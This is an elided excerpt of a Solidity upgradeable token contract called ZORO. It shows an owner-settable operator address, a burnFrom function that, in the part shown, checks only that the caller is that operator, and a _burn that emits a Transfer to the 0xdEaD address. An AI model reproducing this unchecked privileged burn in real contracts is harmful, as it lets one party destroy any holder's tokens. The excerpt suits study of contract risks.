...
// File contracts/zoro.sol

contract ZORO is Initializable, IERC20Upgradeable, OwnableUpgradeable {
    ...
    bool public _lockStatus;
    bool private isValue;
    uint256 public airdropcount;
    address public operanAddr;
    ...
    function initialize(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply, address owner) initializer public {
        __Ownable_init();
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    ...
    */
    ...
    function _burn(address account, uint256 value) internal {
        ...
        require(value <= _balances[account],"Invalid balance");
        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0x000000000000000000000000000000000000dEaD), value);
    }
    ...
    function changeoperonAddr(address _operanAddr)  onlyOwner public returns (bool) {
             operanAddr = _operanAddr;
             return true;
    } 

    function burnFrom(address account, uint256 amount) external override returns (bool){
        require(msg.sender == operanAddr,"You're not authenticated");
